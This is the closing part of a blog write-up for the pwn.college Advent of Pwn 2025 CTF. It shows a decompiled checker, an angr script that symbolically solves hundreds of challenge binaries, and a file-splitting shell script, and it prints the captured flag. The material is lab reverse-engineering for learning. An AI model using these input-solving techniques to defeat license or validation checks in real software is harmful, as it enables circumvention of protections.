<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="n">_EAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="kr">__asm</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vmovdqu</span> <span class="n">ymm0</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_20</span><span class="p">]</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpcmpeqb</span> <span class="n">ymm1</span><span class="p">,</span> <span class="n">ymm0</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">ymmword_408160</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">vpmovmskb</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ymm1</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="k">if</span> <span class="p">(</span> <span class="n">_EAX</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">{</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">v3314</span> <span class="o">=</span> <span class="n">sys_write</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="o">&amp;::</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x31u</span><span class="p">);</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="n">v3315</span> <span class="o">=</span> <span class="n">sys_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="p">}</span>
<span class="err">¬†</span> <span class="n">v3316</span> <span class="o">=</span> <span class="n">sys_write</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_408032</span><span class="p">,</span> <span class="mh">0x35u</span><span class="p">);</span>
<span class="err">¬†</span> <span class="n">v3317</span> <span class="o">=</span> <span class="n">sys_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So the challenge the same as <code class="language-plaintext highlighter-rouge">Day01</code> but with more files and complex transformations.</p><hr /><h3 id="exploitation-11"><span class="me-2">Exploitation</span><a href="#exploitation-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I‚Äôll use <code class="language-plaintext highlighter-rouge">angr</code> to solve each file. Our goal is to find an input of 0x100 bytes that make the program return <strong>Exit code 0</strong>. Our target is to create a input file for each ELF file in <code class="language-plaintext highlighter-rouge">/challenge/naughty-or-nice/</code> so that it returns 0 and print our input (which contains <code class="language-plaintext highlighter-rouge">NICE</code>).</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="n">EXIT_SYSCALL</span> <span class="o">=</span> <span class="mi">60</span>

<span class="k">def</span> <span class="nf">is_exit_with_code</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
    <span class="c1"># 1. Check if the last action was a syscall
</span>    <span class="k">if</span> <span class="n">state</span><span class="p">.</span><span class="n">history</span><span class="p">.</span><span class="n">jumpkind</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">Ijk_Sys_syscall</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># 2. Get the values of rax (syscall number) and rdi (first argument)
</span>        <span class="n">syscall_num</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">solver</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">regs</span><span class="p">.</span><span class="n">rax</span><span class="p">)</span>
        <span class="n">status</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">solver</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">regs</span><span class="p">.</span><span class="n">rdi</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

    <span class="c1"># 3. Check if it's an exit syscall with the desired status code
</span>    <span class="k">return</span> <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">EXIT_SYSCALL</span> <span class="ow">and</span> <span class="n">status</span> <span class="o">==</span> <span class="n">code</span>

<span class="n">simgr</span><span class="p">.</span><span class="nf">explore</span><span class="p">(</span>
    <span class="n">find</span><span class="o">=</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nf">is_exit_with_code</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
    <span class="n">avoid</span><span class="o">=</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nf">is_exit_with_code</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="p">)</span>
</pre></table></code></div></div><p>Full script here:</p><details> <summary>Click to view full <code>check.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">angr</span>
<span class="kn">import</span> <span class="n">claripy</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">stat</span>

<span class="c1"># Input dir
</span><span class="n">BINARY_DIR</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./ls</span><span class="sh">"</span>
<span class="c1"># Output dir
</span><span class="n">OUTPUT_DIR</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./list</span><span class="sh">"</span>

<span class="n">EXIT_SYSCALL</span> <span class="o">=</span> <span class="mi">60</span>

<span class="k">def</span> <span class="nf">is_exit_with_code</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">state</span><span class="p">.</span><span class="n">history</span><span class="p">.</span><span class="n">jumpkind</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">Ijk_Sys_syscall</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">syscall_num</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">solver</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">regs</span><span class="p">.</span><span class="n">rax</span><span class="p">)</span>
        <span class="n">status</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">solver</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">regs</span><span class="p">.</span><span class="n">rdi</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

    <span class="k">return</span> <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">EXIT_SYSCALL</span> <span class="ow">and</span> <span class="n">status</span> <span class="o">==</span> <span class="n">code</span>


<span class="k">def</span> <span class="nf">solve_binary</span><span class="p">(</span><span class="n">binary_path</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Solving </span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">basename</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span><span class="si">}</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">p</span> <span class="o">=</span> <span class="n">angr</span><span class="p">.</span><span class="nc">Project</span><span class="p">(</span><span class="n">binary_path</span><span class="p">,</span> <span class="n">load_options</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">auto_load_libs</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>

    <span class="n">input_len</span> <span class="o">=</span> <span class="mh">0x100</span>
    <span class="n">input_chars</span> <span class="o">=</span> <span class="p">[</span><span class="n">claripy</span><span class="p">.</span><span class="nc">BVS</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">byte_</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">input_len</span><span class="p">)]</span>
    <span class="n">input_ast</span> <span class="o">=</span> <span class="n">claripy</span><span class="p">.</span><span class="nc">Concat</span><span class="p">(</span><span class="o">*</span><span class="n">input_chars</span><span class="p">)</span>

    <span class="n">state</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="nf">entry_state</span><span class="p">(</span>
        <span class="n">stdin</span><span class="o">=</span><span class="n">input_ast</span><span class="p">,</span>
        <span class="n">add_options</span><span class="o">=</span><span class="n">angr</span><span class="p">.</span><span class="n">options</span><span class="p">.</span><span class="n">unicorn</span>
    <span class="p">)</span>
    <span class="n">simgr</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="nf">simulation_manager</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>

    <span class="n">simgr</span><span class="p">.</span><span class="nf">explore</span><span class="p">(</span>
        <span class="n">find</span><span class="o">=</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nf">is_exit_with_code</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
        <span class="n">avoid</span><span class="o">=</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nf">is_exit_with_code</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">simgr</span><span class="p">.</span><span class="n">found</span><span class="p">:</span>
        <span class="n">found_state</span> <span class="o">=</span> <span class="n">simgr</span><span class="p">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">solution</span> <span class="o">=</span> <span class="n">found_state</span><span class="p">.</span><span class="n">posix</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">solution</span><span class="p">[:</span><span class="n">input_len</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Failed to solve </span><span class="si">{</span><span class="n">binary_path</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">OUTPUT_DIR</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">OUTPUT_DIR</span><span class="p">)</span>

    <span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">listdir</span><span class="p">(</span><span class="n">BINARY_DIR</span><span class="p">)</span>
    <span class="n">total</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">files</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">filename</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">files</span><span class="p">):</span>
        <span class="n">bin_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">BINARY_DIR</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
        <span class="n">out_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">OUTPUT_DIR</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isfile</span><span class="p">(</span><span class="n">bin_path</span><span class="p">):</span>
            <span class="k">continue</span>
            
        <span class="n">st</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">stat</span><span class="p">(</span><span class="n">bin_path</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">chmod</span><span class="p">(</span><span class="n">bin_path</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">|</span> <span class="n">stat</span><span class="p">.</span><span class="n">S_IEXEC</span><span class="p">)</span>

        <span class="n">solution</span> <span class="o">=</span> <span class="nf">solve_binary</span><span class="p">(</span><span class="n">bin_path</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="n">solution</span><span class="p">:</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">out_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">solution</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] (</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">total</span><span class="si">}</span><span class="s">) Solved </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">out_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div></details><p>Because there are 461 files so I‚Äôll split into 4 processes to speed up:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nb">mkdir</span> <span class="nt">-p</span> ls1 ls2 ls3 ls4

<span class="nv">count</span><span class="o">=</span>0

<span class="k">for </span>file <span class="k">in</span> ./abc/<span class="k">*</span><span class="p">;</span> <span class="k">do
    if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nv">target_dir</span><span class="o">=</span><span class="s2">"ls</span><span class="k">$((</span> <span class="o">(</span>count <span class="o">%</span> <span class="m">4</span><span class="o">)</span> <span class="o">+</span> <span class="m">1</span> <span class="k">))</span><span class="s2">"</span>
        
        <span class="nb">mv</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$target_dir</span><span class="s2">/"</span>
        
        <span class="o">((</span>count++<span class="o">))</span>
    <span class="k">fi
done

</span><span class="nb">echo</span> <span class="s2">"Done"</span>
</pre></table></code></div></div><p><a href="/assets/img/AdventOfPwn2025/pic28.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic28.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Get flag:</p><p><a href="/assets/img/AdventOfPwn2025/pic29.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic29.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{UD1pycIr14DZ0bB671BGWq449BN.0VN2EjMywiN1UDN0EzW}</code></p><p>Special things recived from <code class="language-plaintext highlighter-rouge">pwn.college</code>:</p><p><a href="/assets/img/AdventOfPwn2025/pic31.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic31.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><hr /><h2 id="epilogue"><span class="me-2">Epilogue</span><a href="#epilogue" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Special thanks to <code class="language-plaintext highlighter-rouge">pwn.college</code> team for an amazing Christmas event. After 12 days ‚Äútry hard‚Äù, I finished the event in the 12th place on the leaderboard - a memorable achivement to end this year!üéÑüöÄ</p><p><a href="/assets/img/AdventOfPwn2025/pic30.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic30.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/pwnable/">Pwnable</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ebpf/" class="post-tag no-text-decoration" >eBPF</a> <a href="/tags/io-uring/" class="post-tag no-text-decoration" >io_uring</a> <a href="/tags/blockchain/" class="post-tag no-text-decoration" >blockchain</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >SSRF</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >SSTI</a> <a href="/tags/pypu-pci/" class="post-tag no-text-decoration" >pypu-pci</a> <a href="/tags/scm-rights/" class="post-tag no-text-decoration" >SCM_RIGHTS</a> <a href="/tags/ms-dos/" class="post-tag no-text-decoration" >MS-DOS</a> <a href="/tags/angr/" class="post-tag no-text-decoration" >angr</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=[Writeup]%20Advent%20of%20Pwn%202025(Pwn%20College)%20-%20KayTii&url=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fpwncollege-advent-writeup%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=[Writeup]%20Advent%20of%20Pwn%202025(Pwn%20College)%20-%20KayTii&u=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fpwncollege-advent-writeup%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fpwncollege-advent-writeup%2F&text=[Writeup]%20Advent%20of%20Pwn%202025(Pwn%20College)%20-%20KayTii" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/pwncollege-advent-writeup/">[Writeup] Advent of Pwn 2025(Pwn College)</a><li class="text-truncate lh-lg"> <a href="/posts/stack-pivot-technique/">[Blog] Stack Pivot - Overflow in libc function</a><li class="text-truncate lh-lg"> <a href="/posts/mimic-writeup/">[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense</a><li class="text-truncate lh-lg"> <a href="/posts/pwn-study-notes/">üìì PWN STUDY NOTES</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/stack-pivot/">stack pivot</a> <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">writeup</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/blockchain/">blockchain</a> <a class="post-tag btn btn-outline-primary" href="/tags/blog/">blog</a> <a class="post-tag btn btn-outline-primary" href="/tags/ebpf/">eBPF</a> <a class="post-tag btn btn-outline-primary" href="/tags/io-uring/">io_uring</a> <a class="post-tag btn btn-outline-primary" href="/tags/ms-dos/">MS-DOS</a> <a class="post-tag btn btn-outline-primary" href="/tags/pypu-pci/">pypu-pci</a> <a class="post-tag btn btn-outline-primary" href="/tags/rop/">rop</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/mimic-writeup/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1764547200" data-df="ll" > Dec 1, 2025 </time><h4 class="pt-0 my-2">[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense</h4><div class="text-muted"><p>Writeup for Mimic CTF 2025</p></div></div></a></article><article class="col"> <a href="/posts/stack-pivot-technique/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1765238400" data-df="ll" > Dec 9, 2025 </time><h4 class="pt-0 my-2">[Blog] Stack Pivot - Overflow in libc function</h4><div class="text-muted"><p>Stack pivot technique</p></div></div></a></article><article class="col"> <a href="/posts/pwn-study-notes/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1742688000" data-df="ll" > Mar 23, 2025 </time><h4 class="pt-0 my-2">üìì PWN STUDY NOTES</h4><div class="text-muted"><p>PWN 101</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/stack-pivot-technique/" class="btn btn-outline-primary" aria-label="Older" ><p>[Blog] Stack Pivot - Overflow in libc function</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>¬© <time>2025</time> <a href="https://github.com/Kaytii210">Khoi Tran</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/stack-pivot/">stack pivot</a> <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">writeup</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/blockchain/">blockchain</a> <a class="post-tag btn btn-outline-primary" href="/tags/blog/">blog</a> <a class="post-tag btn btn-outline-primary" href="/tags/ebpf/">eBPF</a> <a class="post-tag btn btn-outline-primary" href="/tags/io-uring/">io_uring</a> <a class="post-tag btn btn-outline-primary" href="/tags/ms-dos/">MS-DOS</a> <a class="post-tag btn btn-outline-primary" href="/tags/pypu-pci/">pypu-pci</a> <a class="post-tag btn btn-outline-primary" href="/tags/rop/">rop</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside><script> (function () { var btn = document.getElementById('back-to-top'); if (!btn) return; btn.addEventListener('click', function () { btn.classList.remove('slime-click'); void btn.offsetWidth; btn.classList.add('slime-click'); }); btn.addEventListener('animationend', function (e) { if (e.animationName === 'slime-click') { btn.classList.remove('slime-click'); } }); })(); </script></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ 